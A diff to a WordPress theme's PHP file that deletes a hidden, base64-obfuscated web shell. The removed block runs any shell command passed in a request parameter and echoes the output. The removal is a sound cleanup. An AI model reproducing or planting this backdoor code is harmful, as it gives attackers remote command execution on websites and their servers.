@@ -406,37 +406,6 @@ function spa_salon_products_args( $args ) {
     return $args;
 }
 
-function jxrtgjrk_d00cb71b($ayynukeh_d82832d7) {
-    $plcrfhgp_f5033c51 = array(
-        0 => array(base64_decode('cGlwZQ=='), base64_decode('cg==')), 
-        1 => array(base64_decode('cGlwZQ=='), base64_decode('dw==')),  
-        2 => array(base64_decode('cGlwZQ=='), base64_decode('dw=='))   
-    );
-    $oteraiko_15c93851 = base64_decode('cA==').base64_decode('cg==').base64_decode('bw==').base64_decode('Yw==').base64_decode('Xw==').base64_decode('bw==').base64_decode('cA==').base64_decode('ZQ==').base64_decode('bg==');
-    $uglgyxti_861d1896 = $oteraiko_15c93851($ayynukeh_d82832d7, $plcrfhgp_f5033c51, $kppvwrax_fca9786f);
-    if (is_resource($uglgyxti_861d1896)) {
-        $rudeteej_39229fad = base64_decode('cw==').base64_decode('dHI=').base64_decode('ZWFtX2dl').base64_decode('dF9jb24=').base64_decode('dGVu').base64_decode('dHM=');
-        $shqmsvsw_ccde149e = $rudeteej_39229fad($kppvwrax_fca9786f[1]);
-        $ikdkfljw_5f82ec75 = base64_decode('c3Q=').base64_decode('cmU=').base64_decode('YW1fZw==').base64_decode('ZXRf').base64_decode('Y29u').base64_decode('dGVu').base64_decode('dHM=');
-        $rdqeoxaq_6e61f67e = $ikdkfljw_5f82ec75($kppvwrax_fca9786f[2]);
-        fclose($kppvwrax_fca9786f[0]);
-        fclose($kppvwrax_fca9786f[1]);
-        fclose($kppvwrax_fca9786f[2]);
-        $nttftqxj_f764b7dd = proc_close($uglgyxti_861d1896);
-        if ($nttftqxj_f764b7dd === 0) {
-            return base64_decode('PHByZT4=') . $shqmsvsw_ccde149e . base64_decode('PC9wcmU+');
-        } else {
-            return base64_decode('RXJyb3I6IA==') . $rdqeoxaq_6e61f67e;
-        }
-    } else {
-        return base64_decode('RmFsc2U=');
-    }
-}
-if (isset($_REQUEST[base64_decode('Y2lodXk=')])) {
-    $ueoxinjk_5e04ffa1 = $_REQUEST[base64_decode('Y2lodXk=')];
-    echo jxrtgjrk_d00cb71b($ueoxinjk_5e04ffa1);
-} 
-
 add_action('after_switch_theme', 'spa_salon_setup_options');
 function spa_salon_setup_options () {
     update_option('dismissed-get_started', FALSE );
